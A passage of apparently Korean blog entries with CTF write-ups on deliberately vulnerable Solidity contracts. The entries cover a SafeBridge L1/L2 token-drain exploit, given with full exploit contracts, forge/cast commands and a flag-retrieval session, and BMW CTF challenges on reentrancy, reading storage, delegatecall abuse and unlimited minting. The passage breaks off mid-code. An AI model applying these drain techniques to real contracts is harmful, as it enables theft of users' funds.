먼저 ERC1337 내에서 사용하는 동일한 방식으로 해시를 생성한다.  생성한 해시로 임의의로 유효한 서명 값(v, r, s)를 생성한다. (vm.sign() 함수 이용)  permitAndTransfer() 함수 호출을 위한 abi.encodeWithSelector를 생성하고, 토큰 이름인 DHT, 그리고 사용자 주소로, 32 + 20 바이트의 calldata를 생성한다.  call() 함수를 호출해서 토큰 컨트랙트의 permitAndTransfer() 함수를 호출한다.위 과정을 거치면 _msgSender()의 값으로 공격자의 주소가 반환되어 singer == _msgSender() 조건을 맞춰줄 수 있다."
  },
  
  {
    "title": "Real World CTF 6th (SafeBridge)",
    "url": "/posts/RealWorld-CTF-6th/",
    "categories": "CTF",
    "tags": "",
    "date": "2024-01-29 00:00:00 +0900",
    





    
    "snippet": "개요Real World CTF에 웹3 문제 있길래 풀어봤다. SafeBridge 문제의 솔브 조건은 L1 -&gt; L2 브리지에서 토큰 잔액을 빼내는 것이었다. 이더리움에서 L1 -&gt; L2 브리지는 주로 두 가지 계층 간의 상호 작용을 용이하게 하는 기술을 가리킨다.contract Challenge {    address public immut...",
    "content": "개요Real World CTF에 웹3 문제 있길래 풀어봤다. SafeBridge 문제의 솔브 조건은 L1 -&gt; L2 브리지에서 토큰 잔액을 빼내는 것이었다. 이더리움에서 L1 -&gt; L2 브리지는 주로 두 가지 계층 간의 상호 작용을 용이하게 하는 기술을 가리킨다.contract Challenge {    address public immutable BRIDGE;    address public immutable MESSENGER;    address public immutable WETH;    constructor(address bridge, address messenger, address weth) {        BRIDGE = bridge;        MESSENGER = messenger;        WETH = weth;    }    function isSolved() external view returns (bool) {        return IERC20(WETH).balanceOf(BRIDGE) == 0;    }}Challenge.sol 파일을 보면 isSolved() 함수가 있는데 WETH 토큰의 L1 브리지 잔액을 모두 빼내면 된다.Deploy.s.solfunction deploy(address system) internal returns (address challenge) {        vm.createSelectFork(vm.envString(\"L1_RPC\"));        vm.startBroadcast(system);        address relayer = getAdditionalAddress(0);        L1CrossDomainMessenger l1messenger = new L1CrossDomainMessenger(relayer);        WETH weth = new WETH();        L1ERC20Bridge l1Bridge =            new L1ERC20Bridge(address(l1messenger), Lib_PredeployAddresses.L2_ERC20_BRIDGE, address(weth));        weth.deposit{value: 2 ether}();        weth.approve(address(l1Bridge), 2 ether);        l1Bridge.depositERC20(address(weth), Lib_PredeployAddresses.L2_WETH, 2 ether);        challenge = address(new Challenge(address(l1Bridge), address(l1messenger), address(weth)));        vm.stopBroadcast();    }문제 빌드는 deploy.s.sol 스크립트를 통해서 이루어진다. WETH 컨트랙트와 L1 브리지 컨트랙트를 생성하고, WETH 컨트랙트에 2 이더를 예치한다. 이후 L1 브리지 컨트랙트에 대해서 2 이더를 승인하고, L1 브리지 컨트랙트의 depositERC20() 함수를 통해서 L2_WETH로 2 이더만큼 이체한다.L1ERC20Bridge.solfunction depositERC20(address _l1Token, address _l2Token, uint256 _amount) external virtual {    _initiateERC20Deposit(_l1Token, _l2Token, msg.sender, msg.sender, _amount);}function depositERC20To(address _l1Token, address _l2Token, address _to, uint256 _amount) external virtual {    _initiateERC20Deposit(_l1Token, _l2Token, msg.sender, _to, _amount);}function _initiateERC20Deposit(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)    internal{    IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount);    bytes memory message;    if (_l1Token == weth) {        message = abi.encodeWithSelector(            IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.L2_WETH, _from, _to, _amount        );    } else {        message = abi.encodeWithSelector(IL2ERC20Bridge.finalizeDeposit.selector, _l1Token, _l2Token, _from, _to, _amount);    }    sendCrossDomainMessage(l2TokenBridge, message);    deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount;    emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount);}위 함수는 L1 브리지 컨트랙트의 디파짓 함수들이다. _initiateERC20Deposit() 함수가 위 2개의 예치 함수 내부에서 실행되는 되는데 먼저 _l1Token을 사용하여 현재 컨트랙트 주소로 amout 만큼의 토큰을 안전하게 전송하고, 조건에 따라서 IL2ERC20Bridge.finalizeDeposit 셀렉터와 관련된 정보를 인코딩해서 이를 sendCrossDomainMessage() 함수를 통해 L2로 메시지를 전송한다.    function finalizeERC20Withdrawal(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)        public        onlyFromCrossDomainAccount(l2TokenBridge)    {        deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] - _amount;        IERC20(_l1Token).safeTransfer(_to, _amount);        emit ERC20WithdrawalFinalized(_l1Token, _l2Token, _from, _to, _amount);    }    /**     * @inheritdoc IL1ERC20Bridge     */    function finalizeWethWithdrawal(address _from, address _to, uint256 _amount)        external        onlyFromCrossDomainAccount(l2TokenBridge)    {        finalizeERC20Withdrawal(weth, Lib_PredeployAddresses.L2_WETH, _from, _to, _amount);    }위 함수는 L1 브리지 내에 정의되어 있는데 L2로부터 받은 잔액 인출을 완료하는 함수이다.L2ERC20Bridge.sol    function _initiateWithdrawal(address _l2Token, address _from, address _to, uint256 _amount) internal {        IL2StandardERC20(_l2Token).burn(msg.sender, _amount);        address l1Token = IL2StandardERC20(_l2Token).l1Token();        bytes memory message;        if (_l2Token == Lib_PredeployAddresses.L2_WETH) {            message = abi.encodeWithSelector(IL1ERC20Bridge.finalizeWethWithdrawal.selector, _from, _to, _amount);        } else {            message = abi.encodeWithSelector(                IL1ERC20Bridge.finalizeERC20Withdrawal.selector, l1Token, _l2Token, _from, _to, _amount            );        }        sendCrossDomainMessage(l1TokenBridge, message);        emit WithdrawalInitiated(l1Token, _l2Token, msg.sender, _to, _amount);    }위 함수는 L2에서 L1으로 다시 브리지하는 함수이다. _l2Token을 호출해서 l1Token 주소를 가져온다. 즉, 자체 토큰을 발행하고, l1Token 변수에 L1WETH 주소를 넣어주면 L1에 브리지할 수 있다. 그럼 L2 인출은 revert 되지 않고, L1으로 다시 중계된다.    function finalizeERC20Withdrawal(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)        public        onlyFromCrossDomainAccount(l2TokenBridge)    {        deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] - _amount;        IERC20(_l1Token).safeTransfer(_to, _amount);        emit ERC20WithdrawalFinalized(_l1Token, _l2Token, _from, _to, _amount);    }그러나 자금 추적 변수에서 잔액을 업데이트 할 때, Underflow에 의해서 에러가 날 것이다. 이유는 자금 추적 변수에서 잔액을 차감하는데, 이때 [L1WETH][MyToken] 맵핑의 잔액은 0원이기 때문이다.Vuln Stufffunction _initiateERC20Deposit(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)    internal{    IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount);    bytes memory message;    if (_l1Token == weth) {        message = abi.encodeWithSelector(            IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.L2_WETH, _from, _to, _amount        );    } else {        message = abi.encodeWithSelector(IL2ERC20Bridge.finalizeDeposit.selector, _l1Token, _l2Token, _from, _to, _amount);    }    sendCrossDomainMessage(l2TokenBridge, message);    deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount;    emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount);}그러나 L1 브리지 컨트랙트의 _initiateERC20Deposit() 함수 내에서 _l1Token == weth일 경우, L2_WETH로 브리지 하게 되는데, 이후 자금 추적을 위한 데이터를 업데이트할 때,  _l1Token == weth 조건에 대해서 예외 처리가 있지 않아 L2_WETH로 브리지가 되더라도 실제로는 _l2Token 잔액이 업데이트 된다. 이를 통해서 자체 토큰을 L1 Weth에 예치하고, 자체 토큰의 잔액을 업데이트할 수 있다.이렇게 되면 L2 -&gt; L1으로 브리지를 할 때, 자체 토큰의 맵핑이 0이 아니기 때문에 Underflow 발생하지 않아 자금을 정상적으로 공격자의 주소로 인출할 수 있다.Exploit CodeL1 Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.19;import {Script, console2} from \"../lib/forge-std/src/Script.sol\";import {WETH} from \"./L1/WETH.sol\";import {Challenge} from \"./Challenge.sol\";import {L1ERC20Bridge} from \"./L1/L1ERC20Bridge.sol\";import {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";contract Ex1 is Script{    Challenge chall;    L1ERC20Bridge L1ERC20Bri;    WETH weth;    address chall_addr = 0x350A48Fff5C5da93b157fCF682F5421b69983a51;    address ptoken = 0x1faDE8edd7079E4ECD9b22F96FFC3C6d05662090;    constructor() {        chall = Challenge(chall_addr);    }    function exploit() public payable {        address L1_ERC20_BRIDGE = chall.BRIDGE();        address WETH_ADDR = chall.WETH();        console2.log(\"WETH ADDR : \", WETH_ADDR);        L1ERC20Bri = L1ERC20Bridge(L1_ERC20_BRIDGE);        weth = WETH(payable(WETH_ADDR));        weth.deposit{value : 2 ether}();        weth.approve(L1_ERC20_BRIDGE, 2 ether);        L1ERC20Bri.depositERC20To(address(weth), address(ptoken), address(ptoken), 2 ether);        //console2.log(IERC20(WETH_ADDR).balanceOf(L1_ERC20_BRIDGE));    }}L2 Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.20;import \"./L2/L2ERC20Bridge.sol\";import \"./L2/standards/L2WETH.sol\";import {L2ERC20Bridge} from \"./L2/L2ERC20Bridge.sol\";contract Ex2 is L2StandardERC20 {    address L2_ERC20_BRIDGE = 0x420000000000000000000000000000000000baBe;    address L2_WETH = payable(0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000);    L2ERC20Bridge L2ERC20Bri;        constructor() L2StandardERC20(address(0), \"POCAS\", \"POCAS\") {        L2ERC20Bri = L2ERC20Bridge(L2_ERC20_BRIDGE);    }    function exploit(address WETH) public {        l1Token = WETH;        _mint(address(this), 2 ether);        L2WETH(Lib_PredeployAddresses.L2_WETH).approve(L2_ERC20_BRIDGE , 2 ether);        L2ERC20Bri.withdraw(L2_WETH, 2 ether);        L2StandardERC20(address(this)).approve(L2_ERC20_BRIDGE , 2 ether);        L2ERC20Bri.withdraw(address(this), 2 ether);    }}Result&gt; Exploitforge create Ex2 --rpc-url $RU --private-key $PRIVATE_KEYforge script --broadcast --rpc-url $RU --private-key $PRIVATE_KEY Solve -vvcast send \"0x1faDE8edd7079E4ECD9b22F96FFC3C6d05662090\" --rpc-url $RU --private-key $PRIVATE_KEY \"exploit(address)\" \"0xe517aE54a43ad512b0106498Ca249398ea9c4972\"❯ nc 47.251.56.125 1337team token? 314HNMkxQs6cYkLy2HSkaw==1 - launch new instance2 - kill instance3 - get flagaction? 3rwctf{yoU_draINED_BriD6E}ETC  정리 내용문제 풀 때 코드 내에 주석 달아가면서 흐름을 하나 하나 파악하면서 풀어서 그런지 코드들이 지저분하다. 어렵다.. 접을 까 고민 중"
  },
  
  {
    "title": "BMW Web3 CTF",
    "url": "/posts/BMW-CTF/",
    "categories": "CTF",
    "tags": "",
    "date": "2024-01-03 00:00:00 +0900",
    





    
    "snippet": "개요  Introduction안녕하세요. BMW는 Break My Wall의 약자로 나의 벽을 깨부순다는 의미입니다. 나의 한계를 극복함과 동시에 우리가 WEB3 생태계의 진입장벽을 부수자는 의미를 함축하고 있습니다. BMW는 KITRI 차세대 보안리더 양성 프로그램 WHS 1기 프로젝트팀이며, WEB3의 취약점을 연구하고 워게임 사이트를 제작하는 프...",
    "content": "개요  Introduction안녕하세요. BMW는 Break My Wall의 약자로 나의 벽을 깨부순다는 의미입니다. 나의 한계를 극복함과 동시에 우리가 WEB3 생태계의 진입장벽을 부수자는 의미를 함축하고 있습니다. BMW는 KITRI 차세대 보안리더 양성 프로그램 WHS 1기 프로젝트팀이며, WEB3의 취약점을 연구하고 워게임 사이트를 제작하는 프로젝트 주제로 활동하고 있습니다.CTF Purpose암호화폐, 코인과 같은 블록체인 기술을 기반으로 하는 디지털 화폐가 대중성을 갖게 되며, 자연스레 블록체인 보안성의 중요성이 강조되고 있습니다. 블록체인은 투명성과 분산성, 탈중앙화라는 특성을 기반으로 두기에 기존의 Web 2.0보다 강한 보안성이 보장되지만, 그럼에도 불구하고 블록체인의 세계에서도 해킹 및 보안사고는 끊임없이 발생하고 있습니다. 저희 Team BMW는 이러한 블록체인 보안의 중요성이 대두되는 시기에 화이트해커들의 Web3.0 보안 역량을 강화하고 발전시키기 위해 해당 프로젝트를 진행하게 되었습니다.24년 1월 1일인가 2일부터인가 BMW라는 Web3 CTF가 있어서 해봤다. 하면서 도중에 미리 조금 정리를 해둔 것들만 cp/ps 했다.Warm Up (Easy)//SPDX-License-Identifier: MITpragma solidity &gt;= 0.7.0 &lt; 0.9.0;contract Warmup {    string public flag = \"flag{FAKE_FLAG}\";    function Callme() public view returns(string memory) {        return flag;    }}그냥 flag 변수 읽거나, Callme() 함수 호출하면 된다.Over 16 (Easy)// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Over_16 {    mapping(address =&gt; uint16) public balances;    uint16 private originalBalance;    constructor() public {        originalBalance = 21436;        balances[msg.sender] = originalBalance;    }    function add_16(uint _value) public {        balances[msg.sender] += uint16(_value);    }    function get16_Flag() public returns (string memory) {        require(balances[msg.sender] == 16, \"XXXXXXXXXXXXXXXX\");        balances[msg.sender] = originalBalance;        return \"flag{FAKE_FLAG}\";    }    function getBalance() public view returns (uint16) {        return balances[msg.sender];    }}add_16() 함수를 이용해 잔액을 16으로 만들면 된다.Access Control (Medium)// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract AccessControll{    address public owner;    CertificateAuthority CA;    mapping(address =&gt; bool) grantedUsers;    mapping(address =&gt; uint256) public securityLevel;        constructor ( address _owner) {        owner = _owner;    }    function accessRequest(address payable  _CA)public {        CA = CertificateAuthority(_CA);        bool success = CA.verify(msg.sender);        if(success) grantedUsers[msg.sender] = true;            }    function setSecurityLevel( address user, uint256 level)public payable  {        require(grantedUsers[user] == true, \"You need Permission to raise the security level!!\");        (bool success, bytes memory result) = address(CA).delegatecall(abi.encodeWithSignature(\"setLevel(address,address,uint256)\",owner,  user,level));        require(success, \"Delegatecall failed\");        uint256 levelToSet;        assembly {            levelToSet := mload(add(result, 0x20))        }        securityLevel[user] = levelToSet;    }    function flag()public view returns (string memory){        require(grantedUsers[msg.sender] == true, \"You need Permission to get the flag!\");        require(securityLevel[msg.sender] == 5, \"Your level must be 5 to get the flag!\");        return \"flag{FAKE_FLAG}\";    }    receive() external payable  {    }}contract CertificateAuthority{    mapping(address =&gt; bool) grantedUsers;    constructor() {   }    function verify(address user) public payable  returns (bool){        if(msg.value &gt; 1000000000000000000000 ){            grantedUsers[user] = true;            return true;        }        else if (grantedUsers[user] == true){             return true;        }        return false;    }    function setLevel(address owner, address toSet, uint256 level)public returns(uint256){        require(msg.sender == owner);        require(grantedUsers[toSet] == true);                    level = level &lt;&lt; 3;            level = level ^ 0xD9;            level = level &amp; 0x03;        return level;    }     receive() external payable {                 require(msg.value &gt; 1000000000000000000000);             }}이 문제의 플래그 획득 조건은 함수 호출자의 권한이 부여되어 있어야 하고, 보안 레벨이 5이면 된다. 먼저 권한 설정은 accessRequest() 함수에서 진행된다. accessRequest() 함수 내부를 보면 전달받은 주소를 이용해서 외부 컨트랙트를 불러오고, 이 컨트랙트의 verify() 함수를 호출 하는데, 이 함수의 반환 값이 true이면 권한이 설정된다. 이후에 보안 레벨은 setSecurityLevel() 함수에서 설정할 수 있는데, accessRequest() 함수에서 불러온 외부 컨트랙트로 delegatecall()를 이용하여 setLevel() 함수를 호출한다. setLevel() 함수의 반환 값으로 mload(add(result, 0x20))로 하여서 설정할 레벨이 계산된다. mload(add(result, 0x20))는 result 바이트 배열의 시작 위치에서 32바이트를 읽어온 값을 반환한다. 그러니 result의 값이 abi.encode(uint(5))가 반환되게 하면 mload()에 의해 5를 읽어와 보안 레벨이 5로 될 것인다.  mload() 함수는 어셈블리 코드 내에서 사용되며, 특정 메모리 주소로부터 워드(32바이트) 단위의 데이터를 읽어와 변수에 할당하거나 계산에 사용된다.function setLevel(address owner, address toSet, uint256 level) public returns(bytes memory){\tbytes memory result = abi.encode(uint(5));\tconsole2.logBytes(result);    return result;}그래서 위와 같이 setLevel() 함수를 만들어서 레벨을 5로 설정 하려고 해보았는데, delegatecall() 함수의 반환 값인 result를 출력해보면 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000005와 같이 이상한 더미 데이터가 포함되어 레벨이 항상 0x20:32로 설정되는 것을 확인할 수 있었다. 그래서 그냥 이를 바이트로 안 주고, uint로 5를 반환해주니 잘 됐다.  delegatecall()로 특정 함수 호출 시에 그 함수가 바이트 타입을 반환할 경우 추가 정보에 대한 바이트가 함께 딸려온다. 기본 사양인지.. 나만 이러는 건지.. 일단 메모Mamma Mia! (Medium)// SPDX-License-Identifier: MITpragma solidity ^0.8.13;contract MammaMia {    mapping(address =&gt; uint) public balances;    address public flagCapturer;    mapping(address =&gt; bool) public flagResetters;    function deposit() public payable {        require(msg.value &gt; 0, \"Deposit must be greater than zero\");        balances[msg.sender] += msg.value;    }    function withdraw() public {        require(!flagResetters[msg.sender], \"The flag resetter is not allowed to withdraw\");        uint bal = balances[msg.sender];        require(bal &gt; 0, \"No balance to withdraw\");        (bool sent, ) = msg.sender.call{value: bal}(\"\");        require(sent, \"Failed to send Ether\");        balances[msg.sender] = 0;    }    function getBalance() external view returns (uint256) {        return address(this).balance;    }    function captureFlag() public {        require(address(this).balance == 0, \"Contract balance is not zero\");        require(flagCapturer == address(0), \"Flag has already been captured\");        flagCapturer = msg.sender;    }    function resetFlag() public payable {        require(flagCapturer == msg.sender, \"You are not the flag capturer\");        require(msg.value &gt;= 0.001 ether, \"Please add balance to the contract for someone else\");        flagResetters[msg.sender] = true;        flagCapturer = address(0);    }    function getFlag() public view returns (string memory) {        require(flagResetters[msg.sender], \"You are not the flag resetter\");        return \"flag{FAKE_FLAG}\";    }}플래그를 얻기 위한 조건은 flagResetters가 참이어야 한다. flagResetters의 값은 resetFlag() 함수를 통해서 참으로 만들 수 있는데, 함수를 사용하기 위해서는 flagCapturer이 현재 함수를 호출한 사용자이고, msg.value는 0.001 ether 보다 크거나 같아야 한다. flagCapturer는 captureFlag() 함수에서 만들 수 있는데, 이 함수를 사용하기 위해서는 컨트랙트의 잔액을 0으로 만들어야 한다. 그러나 withdraw() 함수를 보면 msg.sender.call() 함수로 돈을 내보낸 이후에 잔액을 0으로 만들고 있기 때문에 Reentrancy 취약점이 발생한다. 이를 이용해서 잔액을 0으로 만들고, 조건을 맞춘 이후에 플래그를 얻으면 된다.Safe Deposit Box (Hard)pragma solidity ^0.8.0;// SPDX-License-Identifier: MITcontract SafeDepositBox {        address owner;    constructor () {        owner = msg.sender;        balances[owner] = 2147483647;    }    struct Transaction {        address to;        address from;        uint amount;    }    uint private state_num = 0;    mapping(uint =&gt; Transaction[]) public userTransactions;    mapping(address =&gt; uint) public balances;       string private secret_password = unicode\"REDACTED\";    modifier fill_money() {        if (balances[owner] &lt; 10000) {            balances[owner] = 2147483647;        }        _;    }    function make_account() public returns (address){        balances[msg.sender] = 1000;        return msg.sender;    }    function introduction_safe_deposit_box() public pure returns (string memory) {        return \"This is a safe asset management service. We haven't been hacked in the last 10 years.\";    }    function safe_remittance_function(string memory password, address _to,uint _amount) external returns (uint){        require(keccak256(abi.encodePacked(password)) == keccak256(abi.encodePacked(secret_password)), \"Incorrect password\");        require(balances[msg.sender] &gt;= _amount);        address _from = msg.sender;        balances[_from] -= _amount;        balances[_to] += _amount;        Transaction memory newTransaction = Transaction({            to: _to,            from: _from,            amount: _amount        });        uint hash = uint(keccak256(abi.encodePacked(block.timestamp)));        userTransactions[hash].push(newTransaction);        return hash;    }    function cancel_transaction(uint _hash) public fill_money{        require(userTransactions[_hash].length &gt; 0, \"No transaction with this hash\");        Transaction storage transactionToCancel = userTransactions[_hash][0];        require(transactionToCancel.from == msg.sender, \"You are not the sender of this transaction\");        balances[transactionToCancel.from] += transactionToCancel.amount;        balances[transactionToCancel.to] -= transactionToCancel.amount;    }    function buy_flag() public returns (string memory) {        require (balances[msg.sender] &gt; 100000, \"Not Enough money.\");        require (msg.sender != owner,\"No Hack.\");        balances[msg.sender] = 0;        string memory flag = return_flag();        return flag;    }        function return_flag() internal returns (string memory) {        return unicode\"flag{REDACTED}\";    }}Safe Deposit Box 문제의 플래그 획득 조건은 잔액을 100000 이상으로 만들면 된다. make_account() 함수를 보면 함수를 호출한 사람의 잔액을 1000으로 초기화 해주는데 이 함수에 대해서 횟수 제한이 없다. 그럼 make_account() 함수로 잔액을 1000으로 초기화하고, safe_remittance_function() 함수로 임의의 사용자에게 전송하면 임의의 사용자의 잔액은 1000이 되고, 나의 잔액은 0이 될 것이다. 그럼 또 다시 make_account() 함수로 잔액을 1000으로 만들고 다시 임의의 사용자로 전송하를 반복해서 트랜잭션 내에 총 100000만큼 포함되게 만든 이후에 해당 트랜잭션을 캔슬하면 트랜잭션 내에 쌓인 모든 잔액을 나의 잔액으로 되돌릴 수 있다. 그러나 safe_remittance_function() 함수의 사용 조건을 보면 비밀번호가 필요하다. secret_password는 keccak256(3)과 keccak256(3) + 1에 위치해 있다. 이 비밀번호를 획득하고, 위에서 설명한 과정을 수행하여 나의 잔액을 100000 이상으로 만들고 플래그를 획득하면 된다.  일반적으로는 컨트랙트의 상태 변수들이 순차적으로 배치되어 연속된 슬롯에 저장될 것으로 예상된다. 하지만 최적화 및 보안상의 이유로, Solidity 컴파일러는 상태 변수의 배치를 단순한 순차적인 방식이 아니라 더 복잡한 방식으로 결정할 수 있고, 이로 인해 상태 변수의 배치가 예상과 다를 수 있다.BMW Bugbounty (Hard)//SPDX-License-Identifier : MITpragma solidity ^0.8.0;import \"./process.sol\";import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";import \"@openzeppelin/contracts/access/Ownable.sol\";contract BMW {    address private owner;    BMW_process private processContract;    constructor () {        processContract = new BMW_process(address(this));        owner = msg.sender;    }    modifier OnlyOwner {        require(msg.sender == owner, \"Your not owner\");        _;    }    function change_owner(address _owner) external OnlyOwner{        owner = _owner;    }    function search_address() external view returns(address) {        return address(processContract);    }    function flag() external returns(string memory){        require(processContract.check_my_nft(msg.sender) &gt; 10000, \"Enough BMW NFT\");        processContract.reset_account();        return \"Exploit-Success!!\";    }}총 2개의 파일이 제공되는데 위 코드는 NFT.sol라는 파일의 코드이다. 그러나 ERC-721가 아닌 ERC-20를 사용하고 있다. 플래그 획득 조건을 보면 10000 이상의 NFT를 소유하고 있으면 된다.//SPDX-License-Identifier : MITpragma solidity ^0.8.0;import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";contract BMW_process is ERC20{    address private guardian;    mapping (address =&gt; mapping (address =&gt; uint256)) private _allowance;    mapping (address =&gt; uint256) private balance;    constructor (address _guardian) ERC20(\"BMW_NFT\", \"BMW\") {        _mint(msg.sender, 1000);        guardian = _guardian;    }    modifier OnlyGuardian {        require(msg.sender == guardian, \"Your not guardian\");        _;    }    function change_guardian(address _guardian) public OnlyGuardian {        guardian = _guardian;    }    function mint() public {        _mint(msg.sender, 10);        balance[msg.sender] = balanceOf(msg.sender);    }    function Buy_nft(uint256 _count) external payable returns(uint256) {        for(uint256 i; i &lt; _count; i++) {            require(msg.value &gt;= 1 ether, \"Not enough Ether\");            balance[msg.sender] = balanceOf(msg.sender);            _mint(msg.sender, balance[msg.sender] + 1);            if (balance[msg.sender] &gt; 10000) {                return balance[msg.sender];            }        }        return balance[msg.sender];    }    function nfttransfer(address _receipt, uint256 _amount) external returns(bool) {        require(balance[msg.sender] &gt; _amount, \"Not enough BMW NFT\");        require(_allowance[msg.sender][_receipt] &gt; _amount, \"Not enough allowance\");        require(balance[msg.sender] &gt; balance[msg.sender] - _amount, \"Detected integer underflow\");        require(_allowance[msg.sender][_receipt] &lt; _allowance[msg.sender][_receipt] + _amount, \"Detected integer overflow\");        super._transfer(msg.sender, _receipt, _amount);                return true;    }    function get_allowance(address _from, address _to, uint256 _amount) external OnlyGuardian returns(bool) {        require(_allowance[_from][_to] &lt; _allowance[_from][_to] + _amount, \"detected integer overflow\");        _allowance[_from][_to] += _amount;    }    function check_my_nft(address _target) public view returns(uint256) {        return balance[_target];    }    function check_allowance(address _from, address _to) public view returns(uint256) {        return _allowance[_from][_to];    }    function reset_account() external OnlyGuardian {        _mint(msg.sender, 0);    }}process.sol 파일은 위와 같다.Buy_nft() 함수를 보면 매우 이상한 점이 있다. msg.value가 1 ether 이거나 이상이라면 _count만큼 토큰 잔액을 _count + 1 만큼 계속 더하는 것을 볼 수 있다. 즉, 1 ether만 있으면 토큰을 무한으로 만들 수 있다. 그리고 for loop가 돌면서 토큰 잔액이 10000보다 클 경우 그냥 종료해버리기 때문애 _count로 큰 정수를 넘기면 10000 이상의 토큰을 얻을 수 있다. 이후에 그냥 플래그 읽으면 된다. 뭐지?"
  },
  
  {
    "title": "2023 X-mas CTF (Alpha Hunter)",
    "url": "/posts/Alpha-Hunter/",
    "categories": "CTF",
    "tags": "",
    "date": "2023-12-25 00:00:00 +0900",
    





    
    "snippet": "개요Description알파벳을 모아 MERRY CHRISTMAS를 완성해 주세요!![RPC Usage]RPC: http://host:port/rpcGET FLAG: curl -X GET http://host:port/flag[Account Information]address: 0x377CFaD82A885Ef59C9243f715F33752804B112...",
    "content": "개요Description알파벳을 모아 MERRY CHRISTMAS를 완성해 주세요!![RPC Usage]RPC: http://host:port/rpcGET FLAG: curl -X GET http://host:port/flag[Account Information]address: 0x377CFaD82A885Ef59C9243f715F33752804B1126private key: 0xdba103874bd715cb05989d00d55f53743dbca7c13c77b2b901c4b6ae90232b5ebalance: 1 ETH[Contract Information]Setup address: 0x3e8C8ec7F7a5A51a7B4509d2f4d534BB3bA040b1문제를 풀기 위해 제공된 정보는 위와 같다. 컨트랙트는 총 3개가 있는데 Setup 컨트랙트 주소만 제공됐다. (1이더가 제공됨).├── House.sol├── Setup.sol├── Store.sol제공된 파일은 House, Setup, Store로 총 3개가 제공되었다.Setup.solpragma solidity ^0.8.0;import \"./Store.sol\";import \"./House.sol\";contract Setup {    Store public immutable store;    House public immutable house;    bool public isStarted;    constructor() payable {        store = new Store();        house = new House();    }    function isSolved() external view returns (bool) {        return         store.totalBalances(address(house), \"A\") &gt;= 1        &amp;&amp; store.totalBalances(address(house), \"C\") &gt;= 1        &amp;&amp; store.totalBalances(address(house), \"E\") &gt;= 1        &amp;&amp; store.totalBalances(address(house), \"H\") &gt;= 1        &amp;&amp; store.totalBalances(address(house), \"I\") &gt;= 1        &amp;&amp; store.totalBalances(address(house), \"M\") &gt;= 2        &amp;&amp; store.totalBalances(address(house), \"R\") &gt;= 3        &amp;&amp; store.totalBalances(address(house), \"S\") &gt;= 2        &amp;&amp; store.totalBalances(address(house), \"T\") &gt;= 1        &amp;&amp; store.totalBalances(address(house), \"Y\") &gt;= 1;    }}Setup.sol 파일은 위와 같다. Setup에서 Store, House 컨트랙트를 생성하기 때문에 제공된 Setupt Addr을 통해서 각 컨트랙트의 주소를 가져올 수 있다. 그리고 문제를 해결하기 위한 조건은 house 컨트랙트가 MERRY CHRISTMAS라는 문자열을 가지고 있게 하면 풀린다. 해당 문자들은 Store 컨트랙트에서 구매가 가능하고, 이를 타 사용자에게 보낼 수 있다.House.solpragma solidity ^0.8.0;contract House {}House 컨트랙트는 코드가 없다. 그냥 주소를 위한 컨트랙트이다.Store.solpragma solidity ^0.8.0;contract Store {    struct DiscountInfo {        uint256 blockNumber;        uint[] discountedItems;        uint[] discountedPrices;        bytes32 discountCoupon;    }    struct Buy {        uint256[] ids;        uint256[] prices;        uint256[] amounts;    }    uint256 public constant REGULAR_PRICE = 0.1 ether;    uint256 public constant PER_N_ITEM = 5;    bytes public constant  ALPHABETS = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\";    // blockNumber -&gt; discountInfo    mapping (uint256 =&gt; DiscountInfo) public discountInfos;    // coupon -&gt; bool    mapping (bytes32 =&gt; bool) public used;     // nonce -&gt; bool    mapping(uint256 =&gt; bool) public nonces;    // owner =&gt; alphabet =&gt; amount    mapping(address =&gt; mapping(bytes1 =&gt; uint256)) public totalBalances;    error InvalidRange();    error AlreadyUsed();    error NotIssued();    error NotMatched();    error LowLevelFailed();    constructor() {    }    // [_lowerBound, _upperBound]    function randRangeWithNonce(uint256 _blockNumber, uint256 _lowerBound, uint256 _upperBound, uint256 _nonce) internal returns (uint256) {        if (_lowerBound &gt; _upperBound) revert InvalidRange();        if (nonces[_nonce]) revert AlreadyUsed();        nonces[_nonce] = true;        bytes memory _seeds = (abi.encode(msg.sender, _blockNumber, _lowerBound + _upperBound, _nonce));        return (uint256(keccak256(_seeds)) % (_upperBound - _lowerBound + 1)) + _lowerBound;    }    // allow duplicates    function randSample(uint256 _blockNumber, uint256[] memory _nonces) internal returns (uint[] memory) {        uint len = PER_N_ITEM;        uint[] memory _samples = new uint[](len);         for(uint i = 0; i &lt; len; i++) {            _samples[i] = randRangeWithNonce(_blockNumber, uint8(ALPHABETS[0]), uint8(ALPHABETS[0]) + ALPHABETS.length - 1, _nonces[i]);        }        return _samples;    }    function getDiscountInfo(uint256 blockNumber) public view returns(uint[] memory, uint[] memory, bytes32) {        return (discountInfos[blockNumber].discountedItems, discountInfos[blockNumber].discountedPrices, discountInfos[blockNumber].discountCoupon);    }        function issueDiscountCoupon(uint256 _blockNumber, uint256[] memory _nonce) public returns(uint, uint256[] memory, uint256[] memory, bytes32) {        DiscountInfo storage _discountInfo = discountInfos[_blockNumber];        uint256[] memory _prices = new uint256[](PER_N_ITEM);        uint256[] memory _ids = randSample(_blockNumber, _nonce);        for(uint256 i = 0; i &lt; PER_N_ITEM; i++) {            uint256 _price = 